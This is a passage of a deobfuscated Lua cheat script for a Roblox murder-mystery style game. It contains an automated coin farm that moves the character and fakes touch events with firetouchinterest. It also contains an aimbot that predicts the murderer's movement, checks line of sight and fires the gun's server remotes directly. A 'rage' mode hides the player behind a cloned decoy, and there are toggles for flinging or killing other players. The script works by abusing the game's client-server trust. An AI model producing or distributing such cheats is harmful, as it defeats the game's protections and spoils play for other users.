			local n11 = item11.dist - math.min(n10, 6) * 9 + math.abs(item11.pos.Y - num15.Y) * 0.6

			if item11.part == value33 then
				n11 -= 12
			end

			local n12 = n11 - ((item11.weight or 1) - 1) * 30

			if n12 < huge then
				if not (_G.__FarmInTerrainWater(item11.pos) or _G.__FarmInTerrainWater(item11.goal)) then
					huge = n12
					value37 = item11
				else
					tbl16[item11.part] = now + 30
				end
			end
		end

		if value37 then
			return value37.part, value37.pos, value37.dist
		end
		return nil, nil, nil
	end

	local function func41(num16)
		if value33 and tbl1[value33] and not tbl16[value33] then
			local magnitude = (value33.Position - num16).Magnitude
			if magnitude <= n2 and not func24(value33.Position, 2) then
				return value33, value33.Position, magnitude
			end
			tbl16[value33] = tick() + 4
		end

		value33 = nil
		local value38, value39, value40 = func40(num16)
		value33 = value38
		return value38, value39, value40
	end

	local function func42()
		if connection then
			return
		end
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		if not character or not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
			return
		end
		flag21 = character
		value23 = humanoid
		flag22 = humanoidRootPart
		value33 = nil
		position = nil
		n8 = nil
		size = nil
		flag25 = _G.CollectCoinsUnderground
		flag24 = false
		value29 = nil
		table.clear(tbl17)
		table.clear(tbl18)
		table.clear(tbl19)
		table.clear(tbl20)

		if connection5 then
			connection5:Disconnect()
		end

		connection5 = workspace.DescendantAdded:Connect(func21)
		func22(true)
		local n10 = 0

		connection = RunService.Heartbeat:Connect(function(deltaTime)
			n10 += deltaTime
			if n10 < n then
				return
			end
			n10 = 0
			if not _G.InRound or not character.Parent or not humanoidRootPart.Parent or not humanoid.Parent or humanoid.Health <= 0 then
				func39(false)
				return
			end
			func22(false)
			local flag32 = humanoid.Health < (_G.__FarmLastHealth or humanoid.Health) - 0.01
			_G.__FarmLastHealth = humanoid.Health
			local flag33 = false

			pcall(function()
				local swimming = Enum.HumanoidStateType.Swimming
				flag33 = humanoid:GetState() == swimming
			end)

			if flag32 or flag33 then
				pcall(_G.__FarmAddDanger, humanoidRootPart.Position)

				if value33 then
					pcall(_G.__FarmAddDanger, value33.Position)
					tbl16[value33] = tick() + 120
					value33 = nil
				end

				func30()
				func34(character, true)
				humanoid.PlatformStand = true
				func35(humanoidRootPart)
				alignPosition.MaxVelocity = math.max(_G.AutoFarmSpeed, 24)
				alignPosition.Position = func31(character, humanoidRootPart, humanoid, nil)
				return
			end

			if not n8 then
				func26(character, humanoidRootPart)
			end

			if flag25 ~= _G.CollectCoinsUnderground then
				flag25 = _G.CollectCoinsUnderground
				value33 = nil

				if not _G.CollectCoinsUnderground then
					func30()
					func34(character, true)
					humanoid.PlatformStand = true
					func35(humanoidRootPart)
					value29 = func31(character, humanoidRootPart, humanoid, nil)
					flag24 = true
				else
					flag24 = false
					value29 = nil
				end
			end

			if flag24 and value29 then
				alignPosition.MaxVelocity = math.max(_G.AutoFarmSpeed, 22)
				alignPosition.Position = value29

				if (humanoidRootPart.Position - value29).Magnitude <= 1.35 then
					flag24 = false
					value29 = nil
				end

				return
			end

			if _G.BagFull then
				if _G.ResetCharacterOnBagFull then
					func30()
					humanoid.PlatformStand = false
					return
				end

				if not flag23 then
					func30()
					func34(character, true)
					humanoid.PlatformStand = true
					func35(humanoidRootPart)
					value28 = func31(character, humanoidRootPart, humanoid, value33 and value33.Parent and value33.Position or nil)
					flag23 = true
				end

				if value28 then
					alignPosition.MaxVelocity = math.max(_G.AutoFarmSpeed, 22)
					alignPosition.Position = value28
					local vector = Vector3.new(humanoidRootPart.CFrame.LookVector.X, 0, humanoidRootPart.CFrame.LookVector.Z)

					if vector.Magnitude < 0.1 then
						vector = Vector3.new(0, 0, -1)
					end

					local unit = vector.Unit
					alignOrientation.CFrame = CFrame.new(Vector3.new(), unit)

					if (humanoidRootPart.Position - value28).Magnitude <= 1.35 then
						func39(false)
					end
				end

				return
			end

			local flag34, value41 = func41(humanoidRootPart.Position)

			if flag34 then
				position = nil
			end

			if not flag34 then
				if _G.CollectCoinsUnderground and size then
					func34(character, true)
					humanoid.PlatformStand = true
					func35(humanoidRootPart)

					if not position then
						position = humanoidRootPart.Position
					end

					alignPosition.Position = position
					local func43 = func38
					local value42 = value27
					local n11

					if value27 then
						n11 = value42
					else
						local y = humanoidRootPart.Position.Y
						local value43 = n8
						local n12

						if n8 then
							n12 = value43
						else
							n12 = 3
						end

						n11 = y + n12 + n6
					end

					func43(humanoidRootPart, n11)
					return
				end

				if alignPosition then
					func36()
				end

				func30()
				pcall(func34, character, false)
				func37(humanoid)
				humanoid.PlatformStand = false
				return
			end

			if hipHeight == nil then
				hipHeight = humanoid.HipHeight
			end

			humanoid.PlatformStand = true
			func34(character, true)
			func35(humanoidRootPart)

			if _G.CollectCoinsUnderground then
				func29(humanoidRootPart)
			else
				func30()
			end

			alignPosition.MaxVelocity = _G.AutoFarmSpeed
			local num17 = func28(value41)
			func38(humanoidRootPart, value41.Y)
			local magnitude = (Vector2.new(humanoidRootPart.Position.X, humanoidRootPart.Position.Z) - Vector2.new(value41.X, value41.Z)).Magnitude
			local position2 = num17 - Vector3.new(0, _G.CollectCoinsUnderground and n7 * math.clamp(magnitude / 6, 0, 1) or 0, 0)
			local magnitude2 = (humanoidRootPart.Position - num17).Magnitude
			alignPosition.Position = position2
			local vector = Vector3.new(value41.X - humanoidRootPart.Position.X, 0, value41.Z - humanoidRootPart.Position.Z)
			local vector2 = Vector3.new(humanoidRootPart.CFrame.LookVector.X, 0, humanoidRootPart.CFrame.LookVector.Z)

			if vector.Magnitude > 0.5 then
				vector2 = vector.Unit
			end

			if vector2.Magnitude < 0.1 then
				vector2 = Vector3.new(0, 0, -1)
			end

			local unit = vector2.Unit
			alignOrientation.CFrame = CFrame.new(Vector3.new(), unit)

			if magnitude2 <= n3 and magnitude <= n3 then
				local now = tick()

				if not tbl17[flag34] then
					tbl17[flag34] = now
				end

				local flag35 = firetouchinterest

				if flag35 then
					flag35 = now - (tbl18[flag34] or 0) >= 0.08
				end

				if flag35 then
					tbl18[flag34] = now

					pcall(function()
						firetouchinterest(humanoidRootPart, flag34, 0)
						firetouchinterest(humanoidRootPart, flag34, 1)
					end)
				end

				local visualPart = tbl1[flag34]
				visualPart = visualPart and visualPart.visualPart

				if not flag34.CanTouch or not visualPart or not visualPart.Parent or visualPart.Transparency >= 0.5 then
					func3(flag34, tbl1[flag34])
					tbl17[flag34] = nil
					tbl18[flag34] = nil
					tbl19[flag34] = nil
					tbl20[flag34] = nil
					value33 = nil
				elseif n4 <= now - tbl17[flag34] then
					tbl16[flag34] = now + 0.8
					tbl17[flag34] = nil
					tbl18[flag34] = nil
					tbl19[flag34] = nil
					tbl20[flag34] = nil
					value33 = nil
				end

				return
			end

			tbl17[flag34] = nil
			tbl18[flag34] = nil

			if not tbl19[flag34] or magnitude2 < tbl19[flag34] - 0.5 then
				tbl19[flag34] = magnitude2
				tbl20[flag34] = tick()
			elseif tick() - (tbl20[flag34] or tick()) >= n5 then
				tbl16[flag34] = tick() + 2
				tbl19[flag34] = nil
				tbl20[flag34] = nil
				value33 = nil
			end
		end)
	end

	_G.FlingMurdererAfterBagFullEnabled = false
	_G.ShootMurdererAfterBagFullEnabled = false
	_G.KillAllAfterBagFullEnabled = false
	_G.ResetCharacterOnBagFull = false
	local flag36 = false
	local n10 = 0

	table.insert(_G.CoinESPConn, RunService.Heartbeat:Connect(function(deltaTime)
		n10 += deltaTime
		if n10 < 0.1 then
			return
		end
		n10 = 0
		local bagFull2 = _G.BagFull and _G.ResetCharacterOnBagFull and _G.InRound and not _G.FlingMurdererAfterBagFullEnabled and not _G.ShootMurdererAfterBagFullEnabled and not _G.KillAllAfterBagFullEnabled

		if bagFull2 and not flag36 then
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")

			if character and humanoid and humanoid.Health > 0 then
				pcall(function()
					humanoid.PlatformStand = false
				end)

				pcall(function()
					humanoid.Health = 0
				end)

				if humanoid.Health > 0 then
					pcall(function()
						character:BreakJoints()
					end)
				end
			end
		end

		flag36 = bagFull2
	end))

	_G.ResetCharacterSetEnabled = function(resetCharacterOnBagFull)
		_G.ResetCharacterOnBagFull = resetCharacterOnBagFull
	end

	_G.FlingMurdererAfterBagFullSetEnabled = function(flag37)
		_G.FlingMurdererAfterBagFullEnabled = flag37 and true or false
	end

	_G.ShootMurdererAfterBagFullSetEnabled = function(flag38)
		_G.ShootMurdererAfterBagFullEnabled = flag38 and true or false
	end

	_G.KillAllAfterBagFullSetEnabled = function(flag39)
		_G.KillAllAfterBagFullEnabled = flag39 and true or false
	end

	_G.AutoFarmSetEnabled = function(autoFarmEnabled)
		_G.AutoFarmEnabled = autoFarmEnabled

		if autoFarmEnabled then
			if _G.InRound then
				func42()
			else
				func39()
			end
		else
			func39()
		end
	end

	_G.AutoFarmSetSpeed = function(num18)
		_G.AutoFarmSpeed = math.clamp(math.floor(num18 + 0.5), 15, 25)
	end

	_G.CollectCoinsUndergroundSetEnabled = function(flag40)
		_G.CollectCoinsUnderground = flag40 and true or false
	end

	_G.__SetReflectToggleOff = function(param24)
		value24 = param24
	end

	local function func44(character)
		hipHeight = nil
		n8 = nil
		size = nil
		local humanoid = character:WaitForChild("Humanoid")

		humanoid.Died:Connect(function()
			if _G.AutoFarmEnabled then
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart then
					pcall(_G.__FarmAddDanger, humanoidRootPart.Position)
				end

				if value33 then
					pcall(_G.__FarmAddDanger, value33.Position)
					tbl16[value33] = tick() + 120
				end
			end

			func39(false)
		end)

		task.defer(function()
			task.wait(0.35)

			if _G.AutoFarmEnabled and _G.InRound and humanoid.Parent and humanoid.Health > 0 then
				func42()
			end
		end)
	end

	if localPlayer.Character then
		func44(localPlayer.Character)
	end

	_G.AutoFarmCharConn = localPlayer.CharacterAdded:Connect(func44)

	table.insert(_G.CoinESPConn, gameplay.RoundStart.OnClientEvent:Connect(function()
		task.wait(0.35)

		if _G.AutoFarmEnabled then
			func42()
		end
	end))

	table.insert(_G.CoinESPConn, gameplay.GameOver.OnClientEvent:Connect(function()
		func39(false)
	end))
end

local flag41
flag41 = false
local func45

func45 = function()
	for _, player in ipairs(Players:GetPlayers()) do
		local flag42 = CurrentRoundClient.PlayerData[player.Name]
		local humanoid = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
		if flag42 and flag42.Role == "Murderer" and not flag42.Dead and humanoid and humanoid.Health > 0 then
			return player
		end
	end

	for _, player in ipairs(Players:GetPlayers()) do
		local character = player.Character
		local backpack = player:FindFirstChild("Backpack")
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		if player ~= localPlayer and humanoid and humanoid.Health > 0 and (character and character:FindFirstChild("Knife") or backpack and backpack:FindFirstChild("Knife")) then
			return player
		end
	end

	return nil
end

local func46

func46 = function()
	local character = localPlayer.Character
	local backpack = localPlayer:FindFirstChild("Backpack")
	character = character and character:FindFirstChild("Gun")
	if character and character:IsA("Tool") then
		return character, false
	end
	backpack = backpack and backpack:FindFirstChild("Gun")
	if backpack and backpack:IsA("Tool") then
		return backpack, true
	end
	return nil, false
end

local func47, func48

do
	local function func49(instance6)
		local shoot = instance6 and instance6:FindFirstChild("Shoot")
		if shoot and shoot:IsA("RemoteEvent") then
			return shoot, "ModernShootEvent"
		end
		local knifeLocal = instance6 and instance6:FindFirstChild("KnifeLocal")
		knifeLocal = knifeLocal and knifeLocal:FindFirstChild("CreateBeam")
		knifeLocal = knifeLocal and knifeLocal:FindFirstChild("RemoteFunction")
		if knifeLocal and knifeLocal:IsA("RemoteFunction") then
			return knifeLocal, "BeamFunction"
		end
		local knifeServer = instance6 and instance6:FindFirstChild("KnifeServer")
		knifeServer = knifeServer and knifeServer:FindFirstChild("ShootGun")
		if knifeServer and knifeServer:IsA("RemoteFunction") then
			return knifeServer, "ShootFunction"
		end

		if knifeServer and knifeServer:IsA("RemoteEvent") then
			return knifeServer, "ShootEvent"
		end

		for _, descendant in ipairs(instance6:GetDescendants()) do
			if descendant.Name == "ShootGun" and descendant:IsA("RemoteFunction") then
				return descendant, "ShootFunction"
			end

			if descendant.Name == "ShootGun" and descendant:IsA("RemoteEvent") then
				return descendant, "ShootEvent"
			end
		end

		return nil, nil
	end

	local function func50(num19, param25, num20, param26)
		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude
		raycastParams.FilterDescendantsInstances = { param26 }
		raycastParams.IgnoreWater = true
		local hit = workspace:Raycast(num19, num20 - num19, raycastParams)
		return not hit or hit.Instance:IsDescendantOf(param25)
	end

	_G.__InnocentInLine = function(num21, flag43, num22, flag44)
		local filterDescendantsInstances = {}

		for _, player in ipairs(Players:GetPlayers()) do
			local character = player.Character
			local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")

			if character and character ~= flag43 and character ~= flag44 and humanoid and humanoid.Health > 0 then
				filterDescendantsInstances[#filterDescendantsInstances + 1] = character
			end
		end

		if #filterDescendantsInstances == 0 then
			return false
		end
		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Include
		raycastParams.FilterDescendantsInstances = filterDescendantsInstances
		return workspace:Spherecast(num21, 0.8, num22 - num21, raycastParams) ~= nil
	end

	_G.__ClearGunShot = function(param27, param28, param29, param30)
		return func50(param27, param28, param29, param30) and not _G.__InnocentInLine(param27, param28, param29, param30)
	end

	func47 = function(flag45, instance7, param31)
		if not flag45 or not instance7 then
			return nil, nil
		end

		for _, item13 in ipairs({ "UpperTorso", "Torso", "HumanoidRootPart", "Head" }) do
			local obj4 = instance7:FindFirstChild(item13)

			if obj4 and obj4:IsA("BasePart") then
				local position = obj4.Position
				if func50(flag45, instance7, position, param31) then
					return obj4, position
				end
			end
		end

		return nil, nil
	end

	local function func51(flag46)
		flag46 = flag46 and flag46.AssemblyLinearVelocity or Vector3.zero

		if flag46.Magnitude > 72 then
			flag46 = flag46.Unit * 72
		end

		if math.abs(flag46.Y) < 1.5 then
			flag46 = Vector3.new(flag46.X, 0, flag46.Z)
		end

		return flag46
	end

	func48 = function(num23, param32, param33, num24, param34)
		local n2 = math.clamp((num24 - num23).Magnitude / 145, 0.035, 0.26)
		local value44 = func51(param33)
		local n3 = num24 + Vector3.new(value44.X * n2, value44.Y * math.min(n2, 0.2), value44.Z * n2)
		if func50(num23, param32, n3, param34) then
			return n3
		end
		return num24
	end

	_G.AimPredictionEnabled = true
	_G.AimPredictionStrength = 1
	_G.AimWallResolveEnabled = true

	local tbl21 = {
		"UpperTorso",
		"Head",
		"HumanoidRootPart",
		"Torso",
		"LowerTorso",
		"RightUpperArm",
		"LeftUpperArm",
		"RightHand",
		"LeftHand",
		"RightUpperLeg",
		"LeftUpperLeg",
		"RightLowerLeg",
		"LeftLowerLeg",
	}

	local obj = setmetatable({}, { __mode = "k" })

	table.insert(_G.CoinESPConn, RunService.Heartbeat:Connect(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer then
				local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart then
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					local entry6 = obj[humanoidRootPart]

					if entry6 then
						entry6.v = entry6.v:Lerp(assemblyLinearVelocity, 0.35)
					else
						obj[humanoidRootPart] = { v = assemblyLinearVelocity }
					end
				end
			end
		end
	end))

	local raycastParams = RaycastParams.new()
	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
	raycastParams.IgnoreWater = true

	local function func52()
		local filterDescendantsInstances = {}

		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				filterDescendantsInstances[#filterDescendantsInstances + 1] = player.Character
			end
		end

		raycastParams.FilterDescendantsInstances = filterDescendantsInstances
	end

	local function predictionLeadFor(part6)
		if not _G.AimPredictionEnabled or not part6 then
			return Vector3.zero
		end
		local entry7 = obj[part6]
		entry7 = entry7 and entry7.v or part6.AssemblyLinearVelocity
		if entry7.Magnitude < 3 then
			return Vector3.zero
		end
		local n2 = 0.09

		pcall(function()
			n2 = math.clamp(localPlayer:GetNetworkPing() or 0.09, 0, 0.4)
		end)

		local n3 = math.clamp((n2 * 2 + 0.05) * (_G.AimPredictionStrength or 1), 0.02, 0.5)
		local n4 = Vector3.new(entry7.X, 0, entry7.Z) * n3

		if n4.Magnitude > 14 then
			n4 = n4.Unit * 14
		end

		local n5 = 0

		if math.abs(entry7.Y) > 3 then
			n5 = entry7.Y * n3 - 0.5 * workspace.Gravity * n3 * n3
		end

		local n6 = math.clamp(n5, -7, 7)
		func52()
		local position = part6.Position

		if n4.Magnitude > 0.2 then
			local hit = workspace:Raycast(position, n4, raycastParams)

			if hit then
				n4 = n4.Unit * math.max((hit.Position - position).Magnitude - 1, 0)
			end
		end

		if n6 < 0 then
			local hit = workspace:Raycast(position + n4, Vector3.new(0, n6 - 3.5, 0), raycastParams)

			if hit then
				n6 = math.max(n6, math.min(hit.Position.Y + 3 - position.Y, 0))
			end
		end

		return Vector3.new(n4.X, n6, n4.Z)
	end

	_G.__PredictionLeadFor = predictionLeadFor

	_G.__ResolveVisibleAim = function(instance8, flag47, param35, flag48)
		if not instance8 or not flag47 then
			return nil, nil, false
		end
		local humanoidRootPart = instance8:FindFirstChild("HumanoidRootPart") or instance8:FindFirstChild("Torso")
		local vector = flag48 ~= false and predictionLeadFor(humanoidRootPart, flag47) or Vector3.zero
		local flag49 = vector.Magnitude > 0.05
		local n2 = nil

		for _, item14 in ipairs(tbl21) do
			local obj5 = instance8:FindFirstChild(item14)

			if obj5 and obj5:IsA("BasePart") then
				local rightVector = obj5.CFrame.RightVector
				local upVector = obj5.CFrame.UpVector

				for _, item15 in ipairs({
					Vector3.zero,
					upVector * obj5.Size.Y * 0.3,
					upVector * -obj5.Size.Y * 0.3,
					rightVector * obj5.Size.X * 0.32,
					rightVector * -obj5.Size.X * 0.32,
				}) do
					local n3 = obj5.Position + item15
					n2 = n2 or n3 + vector
					local tbl22 = flag49 and { n3 + vector, n3 } or { n3 }

					for _, item16 in ipairs(tbl22) do
						if func50(flag47, instance8, item16, param35) then
							flag49 = flag49 and item16 ~= n3
							return item16, obj5, flag49
						end
					end
				end
			end
		end

		return n2, nil, flag49
	end

	local function func53(obj6, flag50, payload, part7, param36)
		if flag50 == "ModernShootEvent" then
			local character = localPlayer.Character
			character = character and character:FindFirstChild("HumanoidRootPart")
			local gunRaycastAttachment = character and (character:FindFirstChild("GunRaycastAttachment") or character:WaitForChild("GunRaycastAttachment", 0.8))
			part7 = part7 and part7:FindFirstChild("Handle")
			local worldCFrame

			if param36 then
				worldCFrame = param36
			else
				worldCFrame = gunRaycastAttachment and gunRaycastAttachment.WorldCFrame or part7 and part7.CFrame or character and character.CFrame
			end

			if not worldCFrame then
				return false
			end
			local cframe = worldCFrame

			if (payload - worldCFrame.Position).Magnitude > 0.05 then
				cframe = CFrame.lookAt(worldCFrame.Position, payload)
			end

			return pcall(function()
				obj6:FireServer(cframe, CFrame.new(payload))
			end)
		end

		if flag50 == "BeamFunction" then
			return pcall(function()
				obj6:InvokeServer(1, payload, "AH2")
			end)
		end

		if flag50 == "ShootFunction" then
			return pcall(function()
				obj6:InvokeServer(0, payload, "AH")
			end)
		end

		if flag50 == "ShootEvent" then
			return pcall(function()
				obj6:FireServer(payload)
			end)
		end
		return false
	end

	local function func54(list12, param37)
		local currentCamera = workspace.CurrentCamera
		local cFrame = currentCamera and currentCamera.CFrame
		local tbl23 = {}
		local clone = nil
		local archivable = list12.Archivable
		list12.Archivable = true

		pcall(function()
			clone = list12:Clone()
		end)

		list12.Archivable = archivable

		if clone then
			clone.Name = "MarbegShotDecoy"

			for _, descendant in ipairs(clone:GetDescendants()) do
				if descendant:IsA("LocalScript") or descendant:IsA("Script") or descendant:IsA("ModuleScript") or descendant:IsA("Tool") then
					descendant:Destroy()
				elseif descendant:IsA("BasePart") then
					descendant.Anchored = true
					descendant.CanCollide = false
					descendant.CanTouch = false
					descendant.CanQuery = false
					descendant.LocalTransparencyModifier = 0
				end
			end

			clone.Parent = currentCamera or workspace
			clone:PivotTo(param37)
		end

		for _, descendant in ipairs(list12:GetDescendants()) do
			if descendant:IsA("BasePart") then
				tbl23[descendant] = descendant.LocalTransparencyModifier
				descendant.LocalTransparencyModifier = 1
			end
		end

		pcall(function()
			RunService:UnbindFromRenderStep("MarbegQuickShotCameraLock")
		end)

		if currentCamera and cFrame then
			RunService:BindToRenderStep("MarbegQuickShotCameraLock", Enum.RenderPriority.Camera.Value + 10, function()
				if workspace.CurrentCamera then
					workspace.CurrentCamera.CFrame = cFrame
				end
			end)
		end

		return function()
			pcall(function()
				RunService:UnbindFromRenderStep("MarbegQuickShotCameraLock")
			end)

			for k, value45 in pairs(tbl23) do
				if k.Parent then
					pcall(function()
						k.LocalTransparencyModifier = value45
					end)
				end
			end

			if clone then
				pcall(function()
					clone:Destroy()
				end)
			end

			if currentCamera and cFrame then
				pcall(function()
					currentCamera.CFrame = cFrame
				end)
			end
		end
	end

	_G.ShootMurderer = function()
		if flag41 or not _G.InRound then
			return false
		end
		local result4 = func45()
		local character = result4 and result4.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		local character2 = localPlayer.Character
		local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
		local humanoid = character2 and character2:FindFirstChildWhichIsA("Humanoid")
		local obj7, value46 = func46()
		if not humanoidRootPart or not humanoidRootPart2 or not humanoid or humanoid.Health <= 0 or not obj7 then
			return false
		end
		flag41 = true

		if value46 then
			humanoid:EquipTool(obj7)
			task.wait(0.12)
		end

		if obj7.Parent ~= character2 then
			flag41 = false
			return false
		end
		local flag51, value47 = func49(obj7)
		if not flag51 then
			flag41 = false
			return false
		end

		local function func55()
			local gunRaycastAttachment = humanoidRootPart2:FindFirstChild("GunRaycastAttachment")
			if gunRaycastAttachment then
				return gunRaycastAttachment.WorldPosition
			end
			local handle = obj7:FindFirstChild("Handle")
			return handle and handle.Position or humanoidRootPart2.Position
		end

		local function func56(flag52)
			local list13 = {}
			local result5 = func55()
			local predictionLeadFor2 = _G.__PredictionLeadFor and _G.__PredictionLeadFor(humanoidRootPart, result5) or Vector3.zero
			local flag53 = predictionLeadFor2.Magnitude > 0.05

			for _, item17 in ipairs({
				"UpperTorso",
				"Head",
				"HumanoidRootPart",
				"Torso",
				"LowerTorso",
				"RightUpperArm",
				"LeftUpperArm",
				"RightHand",
				"LeftHand",
				"RightUpperLeg",
				"LeftUpperLeg",
			}) do
				local obj8 = character:FindFirstChild(item17)

				if obj8 and obj8:IsA("BasePart") then
					local rightVector = obj8.CFrame.RightVector
					local func57 = ipairs
					local vector = Vector3.new(0, obj8.Size.Y * 0.3, 0)
					local n2 = rightVector * obj8.Size.X * 0.3
					local n3 = rightVector * -obj8.Size.X * 0.3
					local tbl24 = { Vector3.zero, vector, n2, n3 }

					for _, value48 in func57(tbl24) do
						local n4 = obj8.Position + value48
						local tbl25 = flag53 and { n4 + predictionLeadFor2, n4 } or { n4 }
						local exitTo = nil

						for _, item18 in ipairs(tbl25) do
							if _G.__ClearGunShot(result5, character, item18, character2) then
								exitTo = 1
								break
							end
						end

						if exitTo == 1 then
							list13[#list13 + 1] = t11
							if (flag52 or 5) <= #list13 then
								return list13
							end
						end
					end
				end
			end

			return list13
		end

		local flag54

		if #func56(1) > 0 then
			flag54 = false

			for i = 1, 3 do
				local list14 = func56(5)
				if #list14 == 0 then
					break
				end
				flag54 = func53(flag51, value47, list14[(i - 1) % #list14 + 1], obj7) or flag54
				task.wait(0.2)
				local humanoid2 = character:FindFirstChildWhichIsA("Humanoid")
				local flag55 = CurrentRoundClient.PlayerData[result4.Name]

				if humanoid2 and humanoid2.Health <= 0 or flag55 and flag55.Dead then
					flag41 = false
					_G.ShootMurdererStatus = "Murderer down (" .. i .. " shot)"
					return true
				end
			end
		else
			local flag56 = false

			for _, item19 in ipairs({ "UpperTorso", "Head", "HumanoidRootPart", "Torso" }) do
				local value49 = character:FindFirstChild(item19)
				local value50

				if value49 then
					local position = value49.Position
					value50 = func50(func55(), character, position, character2)
				else
					value50 = value49
				end

				if value50 then
					flag56 = true
					break
				end
			end

			_G.ShootMurdererStatus = flag56 and "Innocent in the way, holding fire" or "Murderer is behind a wall"
			flag54 = false
		end

		flag41 = false

		if flag54 then
			_G.ShootMurdererStatus = "Shot fired"
		end

		return flag54
	end

	_G.ShootMurdererRage = function()
		if flag41 or not _G.InRound then
			return false
		end
		local result6 = func45()
		local character = result6 and result6.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		local character2 = localPlayer.Character
		local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
		local humanoid = character2 and character2:FindFirstChildWhichIsA("Humanoid")
		local obj9, value51 = func46()
		if not humanoidRootPart or not humanoidRootPart2 or not humanoid or humanoid.Health <= 0 or not obj9 then
			_G.ShootMurdererRageStatus = "Gun or murderer unavailable"
			return false
		end
		flag41 = true

		if value51 then
			humanoid:EquipTool(obj9)
			task.wait(0.12)
		end

		if obj9.Parent ~= character2 then
			flag41 = false
			return false
		end
		local flag57, value52 = func49(obj9)
		if not flag57 then
			flag41 = false
			return false
		end

		local function func58()
			local gunRaycastAttachment = humanoidRootPart2:FindFirstChild("GunRaycastAttachment")
			if gunRaycastAttachment then
				return gunRaycastAttachment.WorldPosition
			end
			local handle = obj9:FindFirstChild("Handle")
			return handle and handle.Position or humanoidRootPart2.Position
		end

		local tbl26 = {
			"UpperTorso",
			"HumanoidRootPart",
			"Torso",
			"Head",
			"LowerTorso",
			"RightUpperArm",
			"LeftUpperArm",
			"RightUpperLeg",
			"LeftUpperLeg",
		}

		local function func59()
			if _G.__PredictionLeadFor then
				return _G.__PredictionLeadFor(humanoidRootPart, func58())
			end
			local n2 = 0.08

			pcall(function()
				n2 = math.clamp(localPlayer:GetNetworkPing() or 0.08, 0, 0.35)
			end)

			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			if vector.Magnitude < 6 then
				return Vector3.zero
			end
			local n3 = vector * n2 * 2

			if n3.Magnitude > 2.5 then
				n3 = n3.Unit * 2.5
			end

			return n3
		end

		local function func60(param38, flag58)
			local list15 = {}
			local result7 = func59()
			local flag59 = result7.Magnitude > 0.01

			for _, item20 in ipairs(tbl26) do
				local obj10 = character:FindFirstChild(item20)

				if obj10 and obj10:IsA("BasePart") then
					local rightVector = obj10.CFrame.RightVector
					local func61 = ipairs
					local vector = Vector3.new(0, obj10.Size.Y * 0.32, 0)
					local vector2 = Vector3.new(0, -obj10.Size.Y * 0.32, 0)
					local n2 = rightVector * obj10.Size.X * 0.32
					local n3 = rightVector * -obj10.Size.X * 0.32
					local tbl27 = { Vector3.zero, vector, vector2, n2, n3 }

					for _, value53 in func61(tbl27) do
						local n4 = obj10.Position + value53
						local tbl28 = flag59 and { n4 + result7, n4 } or { n4 }
						local exitTo = nil

						for _, item21 in ipairs(tbl28) do
							if _G.__ClearGunShot(param38, character, item21, character2) then
								exitTo = 1
								break
							end
						end

						if exitTo == 1 then
							list15[#list15 + 1] = t16_1
							if (flag58 or 6) <= #list15 then
								return list15
							end
						end
					end
				end
			end

			return list15
		end

		local function func62(param39)
			return func60(param39, 1)[1]
		end

		local function func63(flag60)
			local n2 = flag60 or 4

			for i = 1, n2 do
				pcall(function()
					humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
					humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
				end)

				RunService.Heartbeat:Wait()
			end
		end

		local function func64()
			local humanoid2 = character:FindFirstChildWhichIsA("Humanoid")
			if humanoid2 and humanoid2.Health <= 0 then
				return true
			end
			local flag61 = CurrentRoundClient.PlayerData[result6.Name]
			return flag61 and flag61.Dead and true or false
		end
		-- deobfuscated by 𝐒𝐋 -> https://discord.gg/x7YbZeezpm

		if #func60(func58(), 1) > 0 then
			local flag62 = false

			for i = 1, 4 do
				func63(2)
				local list16 = func60(func58(), 6)
				if #list16 == 0 then
					break
				end
				flag62 = func53(flag57, value52, list16[(i - 1) % #list16 + 1], obj9) or flag62
				task.wait(0.22)

				if func64() then
					flag41 = false
					_G.ShootMurdererRageStatus = "Murderer down (" .. i .. " shot)"
					return true
				end
			end

			flag41 = false
			_G.ShootMurdererRageStatus = flag62 and "Shot fired, no confirm" or "Shot failed"
			return flag62
		end

		local pivot = character2:GetPivot()
		local enabled = alignPosition and alignPosition.Parent and alignPosition.Enabled
		local antiFlingEnabled = _G.AntiFlingEnabled == true

		if alignPosition and alignPosition.Parent then
			alignPosition.Enabled = false
		end

		if antiFlingEnabled and _G.AntiFlingSetEnabled then
			_G.AntiFlingSetEnabled(false)
		end

		local value54 = func54(character2, pivot)
		local flag63 = false
		local value55 = nil

		pcall(function()
			local function func65(param40)
				for _, item22 in ipairs({ "UpperTorso", "HumanoidRootPart", "Head" }) do
					local obj11 = character:FindFirstChild(item22)
					if obj11 and obj11:IsA("BasePart") and _G.__ClearGunShot(param40, character, obj11.Position, character2) then
						return obj11.Position
					end
				end

				return nil
			end

			local list17 = {}

			for _, item23 in ipairs({ 5, 7.5, 10 }) do
				for _, item24 in ipairs({ 1.5, 4, -1 }) do
					for i = 0, 11 do
						local num25 = math.rad(i * 30)
						local n2 = humanoidRootPart.Position + Vector3.new(math.cos(num25) * item23, item24, math.sin(num25) * item23)
						local value56 = func65(n2)

						if value56 then
